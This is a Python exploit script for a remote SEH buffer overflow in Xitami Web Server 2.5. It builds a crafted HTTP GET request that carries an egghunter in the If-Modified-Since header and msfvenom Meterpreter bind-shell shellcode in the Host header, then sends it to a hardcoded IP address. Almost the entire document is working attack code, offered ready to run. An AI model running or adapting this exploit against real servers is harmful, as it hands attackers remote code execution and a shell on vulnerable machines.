#!/usr/bin/python
#Author: Samir Sanchez garnica @sasaga92
#Exploit: Xitami Web Server 2.5 Remote Buffer Overflow (SEH + Egghunter)

import sys
import socket
import random
import string
import struct

def pattern_create(_type,_length):
  _type = _type.split(" ")

  if _type[0] == "trash":
    return _type[1] * _length
  elif _type[0] == "random":
    return ''.join(random.choice(string.lowercase) for i in range(_length))
  elif _type[0] == "pattern":
    _pattern = ''
    _parts = ['A', 'a', '0']
    while len(_pattern) != _length:
      _pattern += _parts[len(_pattern) % 3]
      if len(_pattern) % 3 == 0:
        _parts[2] = chr(ord(_parts[2]) + 1)
        if _parts[2] > '9':
          _parts[2] = '0'
          _parts[1] = chr(ord(_parts[1]) + 1)
          if _parts[1] > 'z':
            _parts[1] = 'a'
            _parts[0] = chr(ord(_parts[0]) + 1)
            if _parts[0] > 'Z':
              _parts[0] = 'A'
    return _pattern
  else:
    return "Not Found"

def pwned(_host, _port, _payload):
    print "[*] Conectandose a {0}:{1}...".format(_host, _port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((_host, _port))
    print "[*] Conectado, Enviando payload {0} bytes...".format(len(_payload))
    _payload = "{0}\r\n\r\n".format(_payload, _host)
    print _payload
    s.send(_payload)
    s.close
    print "[+] Payload de {0} bytes Enviado, Satisfactoriamente su payload ejecutado.".format(len(_payload))

def main():

  _offset_eip = 188
  _nseh = "\xeb\xae\x90\x90" #jmp negative
  _seh = "\xb2\x46\x40" #0x004046B2 pop esi #pop ebx #retn
  _egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

  _host = "172.26.2.136"
  _port = 80
  _tag = "w00tw00t"

  #./msfvenom -p windows/meterpreter/bind_tcp LPORT=53 -e x86/shikata_ga_nai   -b '\x00' -f c
  _shellcode = ("\xba\x45\x49\x35\x09\xdb\xda\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
                "\x4e\x83\xc6\x04\x31\x56\x0f\x03\x56\x4a\xab\xc0\xf5\xbc\xa9"
                "\x2b\x06\x3c\xce\xa2\xe3\x0d\xce\xd1\x60\x3d\xfe\x92\x25\xb1"
                "\x75\xf6\xdd\x42\xfb\xdf\xd2\xe3\xb6\x39\xdc\xf4\xeb\x7a\x7f"
                "\x76\xf6\xae\x5f\x47\x39\xa3\x9e\x80\x24\x4e\xf2\x59\x22\xfd"
                "\xe3\xee\x7e\x3e\x8f\xbc\x6f\x46\x6c\x74\x91\x67\x23\x0f\xc8"
                "\xa7\xc5\xdc\x60\xee\xdd\x01\x4c\xb8\x56\xf1\x3a\x3b\xbf\xc8"
                "\xc3\x90\xfe\xe5\x31\xe8\xc7\xc1\xa9\x9f\x31\x32\x57\x98\x85"
                "\x49\x83\x2d\x1e\xe9\x40\x95\xfa\x08\x84\x40\x88\x06\x61\x06"
                "\xd6\x0a\x74\xcb\x6c\x36\xfd\xea\xa2\xbf\x45\xc9\x66\xe4\x1e"
                "\x70\x3e\x40\xf0\x8d\x20\x2b\xad\x2b\x2a\xc1\xba\x41\x71\x8d"
                "\x0f\x68\x8a\x4d\x18\xfb\xf9\x7f\x87\x57\x96\x33\x40\x7e\x61"
                "\x34\x7b\xc6\xfd\xcb\x84\x37\xd7\x0f\xd0\x67\x4f\xa6\x59\xec"
                "\x8f\x47\x8c\x99\x84\xee\x7f\xbc\x66\x7a\x81\x2a\x9b\x12\x6b"
                "\xa5\x44\x02\x94\x6f\xed\xaa\x69\x90\x12\x1f\xe7\x76\x78\x4f"
                "\xa1\x21\x15\xad\x96\xf9\x82\xce\xfc\x83\x8d\x45\xa7\xdc\x65"
                "\x12\xbe\xdb\x8a\xa3\x94\x4b\x1d\x2f\xfb\x4f\x3c\x30\xd6\xe7"
                "\x29\xa6\xac\x69\x1b\x57\xb0\xa3\xc9\x97\x24\x48\x58\xc0\xd0"
                "\x52\xbd\x26\x7f\xac\xe8\x35\x78\x52\x6d\x14\xf2\x65\xfb\x26"
                "\x6c\x8a\xeb\xa6\x6c\xdc\x61\xa6\x04\xb8\xd1\xf5\x31\xc7\xcf"
                "\x6a\xea\x52\xf0\xda\x5e\xf4\x98\xe0\xb9\x32\x07\x1b\xec\x40"
                "\x40\xe3\x71\x40\xb0\x20\xa4\x88\xc7\x4f\x74\xaf\xd8\x3a\xd9"
                "\x86\x72\x44\x4d\xd8\x56")
  
  _trash = pattern_create("trash D", _offset_eip-len(_egghunter))
  _trash += _egghunter
  _trash += _nseh
  _trash += _seh

  _inject = "GET / HTTP/1.1\r\n"
  _inject += "Host: "+ _tag + _shellcode +"\r\n"
  _inject += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
  _inject += "If-Modified-Since: Wed, " + _trash + "\r\n\r\n"

  pwned(_host,_port,_inject)

if __name__ == "__main__":
    main()
